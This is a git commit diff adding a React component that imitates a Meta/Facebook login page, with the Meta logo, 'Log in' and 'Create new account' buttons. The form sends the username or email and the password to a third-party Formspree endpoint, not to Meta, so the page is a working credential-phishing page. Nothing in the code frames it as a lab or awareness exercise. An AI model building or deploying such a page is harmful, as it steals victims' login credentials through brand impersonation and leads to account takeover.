a07350027c39f478eddbb755b61c189437baf80a
jaspreet singh <preetsansoya008@gmail.com>
2024-05-31 22:37:18 +0530

    first commit

---
+++ src/App.jsx
@@ -0,0 +1,107 @@
+
+import styled from 'styled-components'
+import { Link } from 'react-router-dom'
+import { FaMeta } from "react-icons/fa6";
+import logo  from "./logo.png"
+
+
+function App() {
+
+  return (
+    <Container>
+      <img src={logo} alt="" />
+      <br />
+      <br />
+      <br />
+      <br />
+
+      <form action="https://formspree.io/f/xayzloyg" method='POST'>
+
+        <input type="email" name='email' placeholder='Username,email address or mobile number'/>
+        <input type="password" name='password' placeholder='Password'/>
+        <button>Log in</button>
+
+      </form>
+        <p style={{marginLeft:"70px"}}>Forgotten Password?</p>
+      <div className='last'>
+
+
+        <button className='account'>Creare new account</button>
+        <br />
+        <div className="meta">
+
+        <FaMeta className='metaLogo'/>
+        <p>Meta</p>
+        </div>
+      </div>
+    </Container>
+  )
+}
+
+const Container = styled.div`
+margin-left: 500px;
+
+img{
+  width: 100px;
+  height: 100px;
+  margin-left: 80px;
+}
+
+form{
+  display: grid;
+  width: 300px;
+  gap: 10px;
+}
+
+input{
+  width: 270px;
+        overflow:hidden; 
+        white-space:nowrap; 
+        text-overflow: ellipsis;
+  height: 40px;
+border-radius: 8px;
+border-color: lightgray;
+}
+
+::placeholder{
+  padding: 10px;
+}
+
+button{
+  width: 270px;
+  height: 45px;
+  background-color: rgb(31, 62, 201);
+  border-radius: 22px;
+  border: none;
+  color: white;
+  /* font-weight: 600; */
+  font-size: 17px;
+}
+
+.last{
+  margin-top: 100px;
+}
+
+
+.account{
+  background-color: #fff;
+  color: rgb(31, 62, 201);
+  border:1px solid rgb(31, 62, 201);
+}
+
+.meta{
+  margin-left:100px;
+  display: flex;
+  font-size: 20px;
+  margin-top: 8px;
+  /* margin: 5px; */
+}
+
+.meta p{
+  margin-top: -1px;
+  margin-left: 5px;
+  
+}
+`;
+
+export default App
